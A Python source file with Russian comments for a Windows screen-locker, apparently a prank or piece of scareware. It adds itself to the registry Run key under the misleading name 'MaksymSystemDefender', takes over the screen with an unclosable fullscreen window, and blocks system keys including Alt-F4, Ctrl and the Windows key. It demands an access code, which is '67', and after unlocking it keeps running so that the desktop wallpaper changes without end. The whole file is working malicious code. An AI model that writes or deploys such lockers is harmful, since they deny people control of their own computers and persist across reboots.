import tkinter as tk
import sys
import os
from PIL import Image, ImageTk, ImageDraw, ImageFont
import cv2
import keyboard
import ctypes
import winreg
import wallpaper_cycle

def resource_path(relative_path):
    """ Получает путь к файлу внутри EXE или в обычной папке """
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

# Теперь везде, где ты открываешь файлы, пиши так:
video_file = resource_path("1.mp4")
image_file = resource_path("ready_frame.png")
audio_file = resource_path("sound.mp3")
def run_locker():
    # --- 1. ФУНКЦИИ АВТОЗАГРУЗКИ (РЕЕСТР) ---
    def add_to_registry():
        """ Добавляет программу в автозагрузку """
        app_name = "MaksymSystemDefender"

        if getattr(sys, 'frozen', False):
            file_path = sys.executable  # Если EXE
        else:
            file_path = os.path.abspath(__file__)  # Если скрипт

        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0,
                                 winreg.KEY_ALL_ACCESS)
            try:
                existing_value, _ = winreg.QueryValueEx(key, app_name)
                if existing_value == file_path:
                    winreg.CloseKey(key)
                    return  # Уже есть
            except FileNotFoundError:
                pass

            winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, file_path)
            winreg.CloseKey(key)
        except Exception:
            pass

    def remove_from_registry():
        """ Удаляет программу из автозагрузки (при разблокировке) """
        app_name = "MaksymSystemDefender"
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0,
                                 winreg.KEY_ALL_ACCESS)
            try:
                winreg.DeleteValue(key, app_name)
            except FileNotFoundError:
                pass  # Уже удалено
            winreg.CloseKey(key)
        except Exception:
            pass

    # --- СРАЗУ ДОБАВЛЯЕМ В АВТОЗАГРУЗКУ ПРИ СТАРТЕ ---
    add_to_registry()

    # --- 2. ВНУТРЕННИЕ УТИЛИТЫ ---
    def resource_path(relative_path):
        try:
            base_path = sys._MEIPASS
        except Exception:
            base_path = os.path.abspath(".")
        return os.path.join(base_path, relative_path)

    def block_event(event=None):
        return "break"
    # --- ИНИЦИАЛИЗАЦИЯ TKINTER ---
    root = tk.Tk()

    # Настройки окна
    root.attributes("-fullscreen", True)
    root.overrideredirect(True)
    root.attributes("-topmost", True)
    root.configure(bg='black')

    # Блокировка стандартных методов закрытия
    root.protocol("WM_DELETE_WINDOW", block_event)
    root.bind("<Alt-F4>", block_event)

    # Получаем размеры экрана
    screen_w = root.winfo_screenwidth()
    screen_h = root.winfo_screenheight()

    # --- БЛОКИРОВКА КЛАВИАТУРЫ ---
    try:
        keyboard.block_key('windows')
        keyboard.block_key('alt')
        keyboard.block_key('tab')
        keyboard.block_key('ctrl')
        keyboard.block_key('shift')
        keyboard.block_key("F12")
        keyboard.block_key("F13")

    except Exception:
        pass  # Может требовать права администратора

    # --- ЗВУК ---
    sound_file = resource_path("sound.mp3")
    if os.path.exists(sound_file):
        try:
            ctypes.windll.winmm.mciSendStringW(f'open "{sound_file}" type MPEGVideo alias mysound', None, 0, None)
            ctypes.windll.winmm.mciSendStringW("play mysound repeat", None, 0, None)
        except:
            pass

    # --- ВИДЕО И UI ЭЛЕМЕНТЫ ---
    video_path = resource_path('1.mp4')
    cap = None
    if os.path.exists(video_path):
        cap = cv2.VideoCapture(video_path)

    # Создаем Label для видео (объявляем до функции потока)
    l1 = tk.Label(root, bg="black", borderwidth=0)
    l1.place(x=0, y=0)

    # --- ФУНКЦИЯ ПОТОКА ВИДЕО (Замыкание) ---
    def stream_video():
        if cap is None:
            return

        ret, frame = cap.read()
        if ret:
            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            img = Image.fromarray(frame).resize((screen_w, screen_h))
            draw = ImageDraw.Draw(img)

            # Шрифты
            try:
                font_title = ImageFont.truetype("chiller.ttf", 150)
                font_warn = ImageFont.truetype("chiller.ttf", 70)
            except:
                font_title = ImageFont.load_default()
                font_warn = ImageFont.load_default()

            # Текст: ЗАГОЛОВОК
            text_title = "СИСТЕМА ПОД УПРАВЛЕНИЕМ"
            bbox_t = draw.textbbox((0, 0), text_title, font=font_title)
            w_t = bbox_t[2] - bbox_t[0]
            draw.text(((screen_w - w_t) / 2, 100), text_title, font=font_title, fill="black", stroke_width=1,
                      stroke_fill="gray")

            # Текст: ВВЕДИТЕ КОД
            text_warn = "ВВЕДИТЕ КОД ДОСТУПА:"
            bbox_w = draw.textbbox((0, 0), text_warn, font=font_warn)
            w_w = bbox_w[2] - bbox_w[0]
            draw.text(((screen_w - w_w) / 2, screen_h * 0.68), text_warn, font=font_warn, fill="black", stroke_width=1,
                      stroke_fill="gray")

            imgtk = ImageTk.PhotoImage(image=img)
            l1.configure(image=imgtk)
            l1.image = imgtk
            l1.after(30, stream_video)
        else:
            cap.set(cv2.CAP_PROP_POS_FRAMES, 0)
            stream_video()

    # --- ПОЛЕ ВВОДА ---
    entry = tk.Entry(root, font=("Chiller", 40), show="*", justify='center', bg="black", fg="red",
                     insertbackground="red",
                     bd=0)
    entry.place(relx=0.5, rely=0.78, width=350, height=60, anchor="center")
    entry.focus_set()

    # --- ФУНКЦИЯ РАЗБЛОКИРОВКИ ---
    def unlock():
        if entry.get() == "67":
            # 1. Скрываем окно локера (оно исчезнет с экрана)
            root.withdraw()

            # 2. Снимаем блокировку клавиш
            try:
                keyboard.unhook_all()
            except:
                pass

            # 3. Выключаем музыку локера
            try:
                ctypes.windll.winmm.mciSendStringW("close mysound", None, 0, None)
            except:
                pass

            # 4. ЗАПУСКАЕМ бесконечную смену обоев
            # Этот код начнет работать в фоне
            wallpaper_cycle.run_in_background()

            # ВАЖНО: Мы НЕ пишем sys.exit(), чтобы процесс остался в памяти
            # и продолжал менять обои каждую секунду.

    # --- КНОПКА ---
    btn = tk.Button(root, text="UNLOCK", font=("Impact", 20), command=unlock, bg="black", fg="red",
                    activebackground="red",
                    activeforeground="black", bd=0)
    btn.place(relx=0.5, rely=0.88, width=320, height=60, anchor="center")

    # --- ЗАПУСК ---
    if cap:
        stream_video()

    root.mainloop()


# Запускаем главную функцию
if __name__ == "__main__":
    run_locker()